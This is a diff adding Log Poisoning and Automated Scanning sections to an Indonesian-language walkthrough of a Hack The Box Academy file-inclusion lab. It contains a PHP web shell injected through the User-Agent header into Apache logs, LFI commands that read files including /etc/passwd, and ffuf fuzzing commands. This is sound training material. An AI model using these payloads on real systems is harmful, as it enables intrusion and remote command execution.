@@ -278,3 +278,116 @@ http://ip:port/index.php?language=./profile_images/shell.gif&cmd=cat%20/nama_fil
 ```sh
 HTB{***}
 ```
+
+## Log Poisoning
+- Jalankan web target terlebih dahulu
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2046.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2047.JPG)
+
+- **Question:** Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd
+- Akses URL sebagai berikut
+```sh
+http://ip:port/index.php?language=/var/log/apache2/access.log
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2048.JPG)
+
+- Jalankan tool Burp Suite untuk merekam request pada URL diatas
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2049.JPG)
+
+- Setelah request berhasil terekam, klik kanan request tersebut dan pilih **Send to Repeater**
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2050.JPG)
+
+- Pindah ke tab Repeater
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2051.JPG)
+
+- Ubah nilai `User-Agent` menjadi `Poison` lalu klik tombol **Send**. Anda mungkin perlu menekan tombol **Send** dua kali untuk hasil yang sesuai
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2052.JPG)
+
+- Disini kita bisa menginjekkan script RCE pada User-Agent. Ubah nilai `User-Agent` menjadi script RCE dan tambahkan parameter `&cmd=pwd` pada URL lalu klik tombol **Send**
+```sh
+<?php system($_GET['cmd']); ?>
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2053.JPG)
+
+- Dari hasil dapat dilihat kita berada di direktori `/var/www/html`
+```sh
+/var/www/html
+```
+- **Answer**
+```sh
+/var/www/html
+```
+- **Question:** Try to use a different technique to gain RCE and read the flag at /
+- Ubah nilai parameter `cmd` dari `pwd` menjadi `ls%20/` untuk melihat file dan direktori apa saja di direktori `/`
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2054.JPG)
+
+- Disini kita menemukan file txt yang kemungkinan berisi sebuah flag. Sekarang coba buka isi file tersebut menggunakan perintah cat /nama_file
+```sh
+GET /index.php?language=/var/log/apache2/access.log&cmd=cat%20/nama_file.txt
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2055.JPG)
+
+- **Answer**
+```sh
+HTB{***}
+```
+
+## Automated Scanning
+- Jalankan web target terlebih dahulu
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2056.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2057.JPG)
+
+- **Question:** Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt
+- Pada section ini kita akan menggunakan wordlists dari seclists. Wordlists ini secara default belum tersedia di kali linux, jadi anda perlu menginstalasi terlebih dahulu dengan perintah sebagai berikut
+```sh
+sudo apt install seclists
+```
+- Jalankan tool `ffuf` untuk mengetahui nama parameter yang digunakan di halaman `index.php`. Pada percobaan pertama ditemukan banyak hasil dengan ukuran halaman 2309 sehingga kita filter untuk halaman yang berukuran 2309
+```sh
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://ip:port/index.php?FUZZ=value -c -ic -fs 2309
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2058.JPG)
+
+- Dari hasil percobaan diatas ditemukan nama parameter `view`
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2059.JPG)
+
+- Selanjutnya kita gunakan tool `ffuf` lagi untuk menginjekkan payload LFI pada parameter tersebut. Pada percobaan pertama ditemukan banyak hasil dengan ukuran halaman 1935 sehingga kita filter untuk halaman yang berukuran 1935
+```sh
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://ip:port/index.php?view=FUZZ -c -ic -fs 1935 -v
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2060.JPG)
+
+- Ditemukan hasil sebagai berikut
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2061.JPG)
+
+- Sekarang kita coba akses URL di browser
+```sh
+http://ip:port/index.php?view=../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2062.JPG)
+
+- Sekarang kita akses `/flag.txt`
+
+![alt text](https://github.com/rahardian-dwi-saputra/htb-academy-walkthrough/blob/main/File%20Inclusion/assets/fi%2063.JPG)
+
+- **Answer**
+```sh
+HTB{***}
+```
